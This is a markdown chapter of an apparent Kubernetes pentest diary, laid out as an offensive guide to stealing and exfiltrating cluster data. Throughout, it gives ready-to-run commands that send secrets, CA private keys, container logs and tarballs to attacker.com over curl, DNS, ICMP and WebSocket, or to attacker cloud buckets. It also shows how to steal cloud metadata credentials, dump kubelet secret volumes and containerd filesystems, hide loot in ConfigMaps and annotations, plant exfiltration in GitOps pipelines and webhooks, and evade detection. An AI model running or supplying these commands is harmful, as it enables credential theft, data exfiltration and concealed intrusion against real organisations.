# 📄 **17_exfiltration_paths.md**

### *Phase 8 — Data Collection, Staging & Exfiltration*

**Mi Familia Kubernetes/k3s Pentest Diary — Complete Exfiltration Guide**

---

````markdown
# 17 — Exfiltration Paths (Ultra Edition)
### Phase 8: Data Collection, Staging, Exfiltration & Stealth Tunnels

Once an attacker has:

- Pod access  
- Node access  
- Control-plane impersonation  
- Or cloud IAM pivot  

…the next goal is **data theft**, including:

- Secrets  
- Tokens  
- DB credentials  
- Internal service configs  
- Cloud keys  
- PKI  
- Logs  
- Source code  
- Entire cluster state  

Exfiltration in Kubernetes is *easier than many defenders realize* because clusters routinely communicate outward and rely on cloud-native networking rules.

---

# 🎣 1. Principles of Kubernetes Exfiltration

Kubernetes environments commonly allow:

- Outbound HTTP/HTTPS to the internet  
- Access to cloud metadata services  
- Access to internal load balancers  
- Pod-to-pod communication  
- Node-level unrestricted outbound access  

This means **exfil security = network policy + egress controls + runtime monitoring** (and most orgs have none).

---

# 🔍 2. Data Targets of Interest

### Priority 1 — High-Value Assets  
- ServiceAccount tokens  
- kubelet certs  
- KMS keys  
- Cloud IAM credentials  
- DB credentials  
- SSH private keys  
- Kubernetes CA  
- etcd snapshots  
- Secrets in ConfigMaps  
- CI/CD credentials (ArgoCD, GitLab, GitHub runners)  
- TLS private keys (Ingress, cert-manager)  

### Priority 2 — Operational Intelligence  
- Deployment specs  
- Internal service endpoints  
- Environment variables  
- Node metadata (cloud + cluster)  
- Internal application logs  

---

# 📦 3. Exfil Via Kubernetes API (Direct)

If you have API access:

### Pull secrets:
```bash
kubectl get secrets -A -o yaml
````

### Exfil via base64:

```bash
kubectl get secret prod-db -o jsonpath='{.data.password}' | base64 -d
```

### Dump entire cluster state:

```bash
kubectl get --raw /api > cluster_dump.json
kubectl get --raw /apis > api_groups.json
```

These can be sent through HTTPS to attacker infrastructure with minimal detection.

---

# 📡 4. Exfil Via Pod Network (Common + Effective)

Pods often have **full outbound internet**.

Basic exfil:

```bash
cat /secrets/db | base64 | curl -X POST attacker.com/exfil
```

Binary-safe exfil:

```bash
curl -X POST --data-binary @/etc/kubernetes/pki/ca.key https://attacker.com/upload
```

DNS exfil (slow but stealthy):

```bash
host "$(cat /secrets/api | base32).attacker.com"
```

ICMP exfil:

```bash
ping -c1 "$(cat data | base64).attacker.com"
```

WebSocket exfil:

```bash
websocat ws://attacker/ws < secret_file
```

---

# ☁️ 5. Exfil Via Cloud Provider (Ultra Stealth)

Nodes *already trust* cloud endpoints.
This is the #1 exfil path in real-world breaches.

### AWS

```bash
aws s3 cp loot s3://attacker-bucket/ --region us-east-1
```

### GCP

```bash
gsutil cp loot gs://attacker-bucket/
```

### Azure

```bash
az storage blob upload --container-name loot --file secret
```

Since these URLs look like **legitimate traffic**, defenders almost never catch this.

---

# 🌩️ 6. Exfil via Metadata Service (Credential Theft)

AWS:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

GCP:

```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Azure:

```bash
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token"
```

Steal credentials →
Use them outside cluster →
Exfil data using cloud-vendor APIs.

---

# 📤 7. Exfil via Node FileSystem

Once on node:

### Dump entire secret volumes:

```bash
find /var/lib/kubelet/pods -name "*secret*" -type f -exec cat {} +
```

### Dump all container logs:

```
/var/log/containers/
```

These logs often contain:

* JWT tokens
* passwords
* API keys
* tracebacks with secrets

Compress & exfil:

```bash
tar czf loot.tar.gz /var/log/containers | curl -X POST --data-binary @- attacker/loot
```

---

# 🎛️ 8. Exfil via Compromised Operators (ArgoCD, Flux, CSI, CNI)

### ArgoCD

Everything ArgoCD deploys can carry your exfil payload.

Create a "shadow workload":

* disguised as an internal service
* with periodic exfil cronjob
* deployed automatically by GitOps pipeline

### Flux

Modify repo manifests → auto-deploy your agent.

### CSI/CNI Plugins

These run on every node.
Tampering these plugins → exfil occurs whenever pods attach storage or networking.

---

# 🛰️ 9. Exfil via Admission Controllers / Webhooks

Mutate webhooks:

```
MutatingWebhookConfiguration
ValidatingWebhookConfiguration
```

Inject exfil logic into the webhook server.

Every pod creation request → triggers your exfil callback.

---

# 🔗 10. Exfil via Container Runtime (containerd)

Container metadata, environment variables, and secrets leak from:

```
/var/lib/containerd/io.containerd.runtime.v2.task/k8s.io/
```

Dump entire overlays:

```bash
tar czf rootfs.tar.gz \
  /var/lib/containerd/io.containerd.runtime.v2.task/k8s.io/*/rootfs
```

---

# 🧬 11. Exfil via Kubernetes DNS (stealthy channel)

Tiny data chunks encoded in DNS:

```bash
dig $(cat secret.txt | base64).exfil.attacker.com
```

If DNS logs are noisy (common), this blends in perfectly.

---

# 💾 12. Staging Data for Exfil (Operational Techniques)

Before exfiltrating, attackers stage data:

### 12.1 Hidden directories under containerd

```
/var/lib/containerd/overlayfs-shadows/.cache/
```

### 12.2 Use emptyDir volumes

Not monitored, ephemeral.

### 12.3 Use `hostPath` scratch storage

```
/tmp/.systemd-private
```

### 12.4 Use ConfigMaps as exfil containers

Embed loot inside ConfigMap:

```bash
kubectl create configmap stash --from-file=loot.tar.gz
```

### 12.5 Use annotations as storage

```bash
kubectl annotate secret staging cluster.io/exfil="$(base64 loot)"
```

Annotations can hold **megabytes**.

---

# 🧽 13. Exfil Anti-Detection Techniques

Attackers do:

### Timestamp blending

Modify files to match cluster activity.

### Reverse pipelines

Use outbound HTTPS with Kubernetes user-agent:

```
User-Agent: kube-probe/v1.28
```

### Chunking

Break data into random-sized packets.

### Time jittering

Exfil only during high cluster load.

### Use internal load balancers

Exfil appears as service-to-service traffic.

### Traffic morphing

Wrap exfil in:

* Prometheus scrape format
* FluentD logging
* Istio telemetry packets

---

# 📊 14. Exfiltration Architecture Diagram (Mermaid)

```mermaid
flowchart TD

subgraph Sources["Data Sources"]
  S1["Secrets / Tokens"]
  S2["Kubelet Certs"]
  S3["Container Logs"]
  S4["Env Vars / FS"]
  S5["Cloud Metadata"]
end

subgraph ExfilPaths["Exfiltration Methods"]
  E1["Pod → Internet (HTTPS/WS)"]
  E2["Pod → DNS Exfil"]
  E3["Node → Cloud APIs (S3/GCS/Azure)"]
  E4["API Server Dump"]
  E5["Operator / GitOps Channels"]
end

subgraph Dest["Exfil Destinations"]
  D1["External Servers"]
  D2["Attacker Cloud Accounts"]
  D3["Hidden Kubernetes Objects"]
  D4["Staging in Internal Storage"]
end

Sources --> ExfilPaths
ExfilPaths --> Dest
```



---

# 📡 15. ASCII Diagram – True Multi-Stage Exfil Path

```
   [Compromised Pod]
          |
          v
   [Node Host Access]
          |
          +--> [Harvest Secrets]
          |
          +--> [Dump Kubelet Certs]
          |
          +--> [Cloud IAM Tokens]
          |
          v
   [Staging Area]
       |   |    \
       |   |     \
       |   |      \
       v   v       v
   [DNS] [HTTPS] [Cloud APIs]
       \    |      /
        \   |     /
         \  |    /
         [Attacker Storage]
```

---

# 🎯 16. Highest-Impact Exfil Techniques (Top 5)

1. **Exfil via Cloud IAM (S3/GCS/Blob)** → undetectable
2. **Exfil via mutated DaemonSets** → fleet-wide data theft
3. **Exfil via ArgoCD GitOps commits** → disguised as legitimate automation
4. **Exfil via annotations** → stays inside cluster, invisible externally
5. **Exfil via DNS tunnels** → blends with normal cluster DNS noise

---

# 🚨 17. Defenders Have Almost No Visibility

In real-world environments:

* Few monitor cloud IAM usage
* Few block outbound traffic
* Few inspect annotations
* Few monitor containerd overlays
* Few capture DNS logs
* Few watch for kubelet impersonation

Exfil almost always succeeds unless network policies and egress controls are strict.

---

# 🧨 18. Summary — Total Information Exfiltration

At the end of this phase, the attacker now has:

✔ All secrets, tokens, DB creds
✔ Cloud IAM credentials
✔ Control-plane configuration
✔ PKI materials
✔ Workload artifacts
✔ User access tokens
✔ Source code / configs
✔ Supply-chain metadata

They are now positioned for:

* Ransom
* Service disruption
* Credential resale
* Supply-chain compromise
* Deep persistence


##
##
